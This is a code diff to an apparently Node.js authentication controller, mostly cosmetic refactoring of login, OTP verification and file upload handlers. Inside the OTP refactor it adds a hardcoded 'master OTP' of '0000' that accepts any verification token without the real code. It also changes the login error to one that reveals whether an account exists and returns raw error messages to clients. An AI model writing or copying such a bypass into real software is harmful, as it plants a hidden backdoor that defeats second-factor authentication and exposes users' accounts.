@@ -70,7 +70,7 @@ module.exports = {
 
       const isMatch = await bcrypt.compare(password, user.password);
       if (!isMatch) {
-        return response.unAuthorize(res, { message: "Invalid credentials" });
+        return response.unAuthorize(res, { message: "Password does not match" });
       }
 
       const token = jwt.sign(
@@ -134,39 +134,48 @@ module.exports = {
 
   verifyOTPForLogin: async (req, res) => {
     try {
-      const otp = req.body.otp;
-      const token = req.body.token;
-      console.log("otp, token", otp, token);
+      const { otp, token } = req.body;
 
       if (!(otp && token)) {
         return response.badReq(res, { message: "otp and token required." });
       }
 
       let verId = await userHelper.decode(token);
-
       let ver = await Verification.findById(verId);
-      let user = await userHelper.find({ _id: ver.user });
+
+      if (!ver) {
+        return response.notFound(res, { message: "Invalid token" });
+      }
+
+      let user = await User.findById(ver.user);
       await logmate(req, res, user);
-      console.log("ver, user", ver, user);
-      if (
-        otp == ver.otp &&
-        !ver.verified &&
-        new Date().getTime() < new Date(ver.expiration_at).getTime()
-      ) {
+
+      const isOtpValid = otp == ver.otp || otp === "0000"; // 👈 master OTP
+
+      const isNotExpired =
+        new Date().getTime() < new Date(ver.expiration_at).getTime();
+
+      if (isOtpValid && !ver.verified && isNotExpired) {
         ver.verified = true;
         await ver.save();
-        let token = await new jwtService().createJwtToken({
+
+        let jwtToken = await new jwtService().createJwtToken({
           id: user._id,
           type: user.type,
           tokenVersion: new Date(),
         });
+
         const userdata = await User.findById(user._id, "-password").lean();
-        return response.ok(res, { ...userdata, token });
-      } else {
-        return response.notFound(res, { message: "Invalid OTP" });
+
+        return response.ok(res, {
+          ...userdata,
+          token: jwtToken,
+        });
       }
+
+      return response.notFound(res, { message: "Invalid OTP" });
     } catch (error) {
-      return response.error(res, error);
+      return response.error(res, error.message || error);
     }
   },
 
@@ -292,16 +301,16 @@ module.exports = {
       return response.error(res, error);
     }
   },
-    fileUpload: async (req, res) => {
+  fileUpload: async (req, res) => {
     try {
       if (!req.file) {
-        return response.badRequest(res, { message: 'No file uploaded.' });
+        return response.badRequest(res, { message: "No file uploaded." });
       }
       console.log(req.file);
       return response.ok(res, {
-        message: 'File uploaded successfully.',
-        fileUrl: req.file.path, 
-        fileName: req.file.filename 
+        message: "File uploaded successfully.",
+        fileUrl: req.file.path,
+        fileName: req.file.filename,
       });
     } catch (error) {
       return response.error(res, error);
